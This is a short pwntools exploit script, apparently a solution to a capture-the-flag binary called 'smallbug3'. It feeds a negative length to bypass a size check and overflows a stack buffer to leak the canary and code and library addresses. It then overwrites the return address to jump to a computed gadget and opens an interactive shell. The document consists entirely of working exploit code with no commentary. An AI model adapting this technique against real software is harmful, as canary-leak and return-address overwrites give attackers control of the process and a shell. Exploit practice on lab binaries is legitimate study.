from pwn import *

context.log_level='debug'
p=process("./smallbug3")
p.sendlineafter(":\n","-1")
p.sendlineafter(":\n","a"*17*8)
p.recvuntil("aaaa\n")
canary="\x00"+p.recv(7)
addr=u64(p.recv(6)+"\x00\x00")
print hex(u64(canary)),hex(addr)
gdb.attach(p)
p.sendafter(":\n","a"*17*8+canary+"a"*8+p64(addr-0x104))
p.sendlineafter(":\n","-1")
p.sendafter(":\n","a"*20*8+"a"*16*8)
p.recvuntil("a"*20*8+"a"*16*8)
s=u64(p.recv(6)+"\x00\x00")
print hex(s)
p.sendafter(":\n","a"*17*8+canary+"a"*8+p64(s-0x3955b5))
p.interactive()
